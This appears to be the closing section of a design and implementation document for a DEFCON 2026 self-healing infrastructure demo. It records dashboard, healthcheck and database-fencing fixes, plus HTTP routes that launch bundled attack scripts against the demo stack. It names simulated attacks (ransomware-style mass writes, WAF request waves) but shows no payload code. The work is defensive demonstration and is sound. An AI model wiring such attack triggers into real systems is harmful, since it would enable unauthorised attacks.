| **Golden image supply chain gap** | If the Dockerfile, CI/CD pipeline, or base image is compromised, every respawn deploys a poisoned container. Mitigation: image signing (cosign), SBOM, immutable artifact registries. This is the Level 4 CTF challenge. |
| **WAF panel renders only after the WAF button is clicked** | The panel is hidden by default (`display:none`) and unhides on first click of the dashboard's WEB APP ATTACK button. Counters and rows update from `/state.waf` once visible. Workaround: click the WAF button at least once during stage warm-up so the panel is on screen for the audience. |

---

## 10. Implementation Notes — 2026-04-17 Gap Analysis & Fix Pass

A live audit of the running stack uncovered seven gaps between the documented behaviour and what was actually executing. All have been resolved in code; this section captures what changed, why, and how to verify.

### 10.1 What was wrong

| ID | Severity | Symptom | Root cause |
|---|---|---|---|
| **A** | Critical | Dashboard frozen on `CONNECTING…`; tier rings, MTTR, agent stats, WAF panel never updated despite `/state` returning 200s | `drawSparkline` mangled `var(--green)` → `--green,0.3` and passed it to Canvas `addColorStop`, which threw `SyntaxError`. The throw aborted `runPoll`'s try-block before any other UI updater ran. |
| **B** | High | Dashboard's four "TRIGGER SCENARIO" buttons did nothing | `ai_agent3.py` had no `/trigger/*` routes; `fetch('/trigger/web')` returned 404. |
| **C** | High | `demo3-web` permanently `(unhealthy)` despite serving HTTP 200 | `docker-compose3.yml` overrode the Dockerfile's `curl` healthcheck with `wget`; busybox `wget` resolves `localhost` to `::1` first; `nginx.conf` only `listen 80;` (no IPv6). |
| **G** | Low | Tier subtitles read "phoenix-demo:golden" and "Node.js API" | Stale labels in dashboard HTML from a Demo-2 copy-paste. |
| **I** | Medium | DB tier could only reach `MASS_WRITE_DETECTED` — no recovery path fired | `db_fence_replica` function existed in `guardian3.sh` but was never invoked from `main()`. |
| **J** | Medium | `setup_and_run3.sh reset` reported success but never wiped DB volumes | Hard-coded `demo3-real_*` names; compose project is `demo-3` (lowercase folder). |
| **WAF panel** | Medium | Even after clicking the WAF button, `REQUESTS SENT=0`, `BLOCK RATE=0%` | Dashboard read `waf.requests_total`/`waf.attacker_ip`/`waf.site_status` and `e.req`; agent emits `waf.total`/`waf.attacker`/`waf.status` and flat events. |

### 10.2 What we changed

**`ai_agent3.py`**
- Added `TierState.mttr_hist` (deque maxlen=20) and `avg_mttr_ms()` helper.
- Each `RESPAWN_SUCCESS` / `RESTART_SUCCESS` / `FAILOVER_SUCCESS` / `REPLICA_RESUMED` appends `mttr_ms` to the tier's history.
- `REPLICA_RESUMED` now flips DB tier to `RESTORED` and contributes to incident count + bleed prevented.
- New `state.rollup` block: `avg_mttr_per_attack_ms`, `combined_mttr_ms`, `total_attacks`.
- New HTTP handler: `GET /trigger/{web|app|db|waf}` → `subprocess.Popen("bash attack3_<target>.sh")` and returns 202; unknown target returns 400.

**`guardian/guardian3.sh`**
- New locals `db_fenced`, `db_quiet_ticks`, `db_fence_start_ms`.
- On `MASS_WRITE_DETECTED` with `db_fenced=0`: capture `ms()` and call `db_fence_replica` (one-shot per incident).
- After 10 consecutive ticks with `delta <= 500`: call `pg_wal_replay_resume()`, compute `mttr = ms() - db_fence_start_ms`, increment `DB_FAILOVER_COUNT`, emit `REPLICA_RESUMED` with `mttr_ms` populated.

**`dashboard3.html`**
- `drawSparkline` uses an explicit `SPARK_RGBA` map (and `SPARK_STROKE` for the line) instead of string-mangling CSS vars.
- Tier panels now show **avg** MTTR as the big number, with caption "Avg of N attacks · last X · target Y".
- Footer R chip relabelled "avg MTTR per attack · n=N"; new purple **C** chip shows `combined_mttr_ms` ("combined stack MTTR (WEB+APP+DB)" or whichever subset has data).
- New event-log labels: `RANSOM↑` (was `RANSOM`), `FENCE↑`, `REPLICA_RESUMED → RESTORED`.
- `updateWafPanel` reads both old and new field names (`waf.total ?? waf.requests_total` etc.) and synthesises the `req` shape that the renderer expects from flat `REQUEST_BLOCKED`/`REQUEST_PASSED` events, with a built-in `MITRE_BY_ATTACK` lookup table.
- Tier subtitles corrected: `nginx · demo3-web:golden`, `Flask API · stateful`.

**`docker-compose3.yml`**
- `demo3-web` healthcheck now `["CMD", "curl", "-fs", "http://127.0.0.1/health"]` (matches the Dockerfile).

**`setup_and_run3.sh`**
- `cmd_reset` iterates over current and legacy volume names: `demo-3_*`, `Demo-3_*`, `demo3-real_*` — whichever exists is dropped.

### 10.3 Verification (live, 2026-04-17)

| Check | Result |
|---|---|
| `docker ps` after recreate | All 5 containers `(healthy)` |
| `curl /trigger/{web,app,db,waf}` | 202 Accepted; matching `attack3_*.sh` runs |
| `curl /trigger/bogus` | 400 with JSON error |
| Dashboard pill | Flips from `CONNECTING…` to ● MONITORING |
| WEB attack ×3 | history `[630, 624, 657]` ms · avg **637 ms** |
| APP attack ×3 | history `[735, 729, 732]` ms · avg **732 ms** |
| DB attack ×2 | history `[12504, 12617]` ms · avg **12.56 s** · `pg_is_wal_replay_paused()=t` confirmed during fence window |
| Footer R chip | renders avg MTTR per attack with `n=` count |
| Footer C chip | renders sum of tier averages (e.g. WEB+APP+DB) |
| WAF panel after attack | REQUESTS SENT 14 · BLOCKED 13 · BLOCK RATE 93 % · MITRE tags rendered per row |
| W verdict | ✓ WIN: R < 30 s |

### 10.4 Known follow-ups (small)

- `attack3_waf.sh` totals `REQUEST_*` events as 14 even when 15 waves run (the `ATTACK_START` line carries `tier:WAF` but isn't a request); cosmetic block-rate skew of 1 unit. Doc tables still cite 13/15 from script-side counters.
- `waf.attacker` shows `---.---.---.---` whenever `ifconfig.me` is unreachable from the host. Falls back gracefully but obscures the source-IP demo theatre.
- The existing manual `db_promote_replica` failover path is still untested in this pass; only the fence/resume path is now automatic.

---

> *"We aren't showing how to stop a hacker. We are showing how to make a hacker's success temporary."*

**DEFCON Coimbatore 2026 · github.com/CyberRant-lab/Defcon · RESILIENCE · RECOVERY · RESPAWN**
